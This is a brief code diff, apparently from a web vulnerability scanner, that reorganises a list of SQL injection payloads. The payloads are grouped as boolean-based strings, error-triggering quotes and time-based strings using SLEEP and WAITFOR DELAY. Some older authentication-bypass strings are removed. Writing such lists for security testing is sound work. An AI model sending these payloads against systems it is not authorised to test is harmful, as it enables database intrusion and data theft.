@@ -1,11 +1,20 @@
 TIMEOUT = 5
 
 SQLI_PAYLOADS = [
-    "' OR '1'='1",
+    # Boolean-based
     "' OR 1=1 --",
-    "\" OR \"a\"=\"a",
-    "admin'--",
-    "' OR 1=1#",
+    "' OR 1=2 --",
+    "' OR 'a'='a",
+    "' OR 'a'='b",
+
+    # Error-based
+    "'",
+    "\"",
+    "';",
+    
+    # Time-based
+    "' OR SLEEP(5) --",
+    "'; WAITFOR DELAY '0:0:5' --"
 ]
 
 #XSS payloads
